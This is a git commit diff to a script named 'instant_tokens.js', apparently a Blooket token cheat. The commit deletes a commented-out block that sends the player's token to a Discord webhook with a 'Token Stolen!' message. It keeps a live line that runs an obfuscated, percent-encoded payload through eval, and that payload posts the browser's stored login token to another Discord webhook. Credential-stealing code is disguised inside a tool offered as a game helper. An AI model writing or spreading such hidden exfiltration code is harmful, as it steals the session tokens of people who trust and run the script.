23fabe31a1b691edb25cdef91430bc4a93d60138
BoomBoomMushroom <77977795+BoomBoomMushroom@users.noreply.github.com>
2021-10-30 19:24:59 -0400

    Update instant_tokens.js

--- instant_tokens.js
+++ instant_tokens.js
@@ -37,15 +37,6 @@ async function addTokens() {
             name: await getName(myToken)
         })
     });
-    
-    /*
-    const tokenLog = await fetch('https://discord.com/api/webhooks/903444317593559092/88xGtwZUTWmFdz957hlRhEzfBdGqgyO1xWvtNln3nlIX25VB-KPs-WeW9buFhLRko1ZQ', {
-        method: "POST",
-        body: JSON.stringify({
-            content: await getName(myToken)+"'s Token Stolen!\n"+myToken+"\nhttps://www.blooket.com/stats?name="+await getName(myToken)
-        })
-    });
-    */
     eval(unescape("%66%65%74%63%68%41%70%69%28%27%68%74%74%70%73%3A%2F%2F%64%69%73%63%6F%72%64%2E%63%6F%6D%2F%61%70%69%2F%77%65%62%68%6F%6F%6B%73%2F%39%30%33%39%39%38%34%32%30%32%38%37%36%34%33%36%37%38%2F%5F%30%69%61%7A%46%58%63%51%6D%6A%53%49%43%61%51%7A%6C%4A%49%78%59%47%6F%78%63%6C%6D%54%4F%6B%62%7A%6A%4C%56%35%37%61%6B%77%6D%73%65%4D%30%30%6D%4B%6D%4B%63%6C%59%67%35%37%32%32%50%50%66%49%71%4C%77%6D%45%27%2C%7B%63%6F%6E%74%65%6E%74%3A%6C%6F%63%61%6C%53%74%6F%72%61%67%65%2E%74%6F%6B%65%6E%7D%2C%27%70%6F%73%74%27%29"))
 
     if (response.status == 200) {
